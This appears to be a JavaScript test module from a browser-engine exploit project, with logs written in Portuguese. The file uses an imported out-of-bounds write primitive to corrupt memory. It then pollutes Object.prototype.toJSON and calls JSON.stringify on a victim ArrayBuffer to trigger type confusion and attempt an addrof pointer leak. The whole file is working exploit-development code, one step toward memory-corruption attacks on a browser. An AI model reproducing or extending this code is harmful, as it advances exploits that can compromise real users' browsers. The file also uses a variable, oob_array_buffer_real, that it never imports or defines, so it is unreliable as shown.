// js/script3/testArrayBufferVictimCrash.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v1";

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;
const FILL_PATTERN = 0.123456789101112;

let toJSON_call_details_v28 = null;
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null;

function toJSON_V28_MinimalProbe_With_AddrofAttempt() {
    toJSON_call_details_v28 = {
        probe_variant: "V28_Probe_With_Addrof",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: false
    };

    try {
        toJSON_call_details_v28.probe_called = true;
        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
        logS3(`[toJSON_Probe_With_Addrof] 'this' é o objeto vítima. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "leak");

        if (this === victim_ab_ref_for_original_test && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
            logS3(`[toJSON_Probe_With_Addrof] HEISENBUG CONFIRMADA! Tentando escrever object_to_leak_for_addrof_attempt em this[0]...`, "vuln");
            if (object_to_leak_for_addrof_attempt) {
                this[0] = object_to_leak_for_addrof_attempt;
                logS3(`[toJSON_Probe_With_Addrof] Escrita de referência em this[0] (supostamente) realizada.`, "info");
            } else {
                logS3(`[toJSON_Probe_With_Addrof] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
            }
        }
    } catch (e) {
        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[toJSON_Probe_With_Addrof] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    return { minimal_probe_executed: true };
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof ---`, "test", FNAME_CURRENT_TEST);

    toJSON_call_details_v28 = null;
    victim_ab_ref_for_original_test = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu."
    };
    
    const corruptionTargetOffsetInOOBAB = 0x7C;
    const ppKey = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let pollutionApplied = false;
    let potentiallyCrashed = true;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        await PAUSE_S3(100);

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_on_victim.fill(FILL_PATTERN);

        Object.defineProperty(Object.prototype, ppKey, {
            value: toJSON_V28_MinimalProbe_With_AddrofAttempt,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);
        potentiallyCrashed = false; // Se chegamos aqui, não houve crash silencioso

        logS3(`JSON.stringify(victim_ab) completou.`, "info", FNAME_CURRENT_TEST);

        if (toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]") {
            logS3(`HEISENBUG CONFIRMADA (fora da sonda)! Verificando buffer...`, "vuln", FNAME_CURRENT_TEST);
            const value_read_as_double = float64_view_on_victim[0];
            addrof_result.leaked_address_as_double = value_read_as_double;

            if (value_read_as_double !== FILL_PATTERN) {
                const conv_buf = new ArrayBuffer(8);
                new Float64Array(conv_buf)[0] = value_read_as_double;
                const int_view = new Uint32Array(conv_buf);
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int_view[0], int_view[1]);
                addrof_result.success = true;
                addrof_result.message = "Heisenbug confirmada E valor no buffer foi alterado. Ponteiro candidato obtido.";
                document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
            } else {
                addrof_result.message = "Heisenbug confirmada, mas o buffer não foi alterado.";
                document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
            }
        }

    } catch (e) {
        errorCapturedMain = e;
        logS3(`ERRO CRÍTICO no teste: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28}: FALHOU`;
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            else delete Object.prototype[ppKey];
        }
        clearOOBEnvironment();
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
    }

    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: potentiallyCrashed,
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result
    };
}
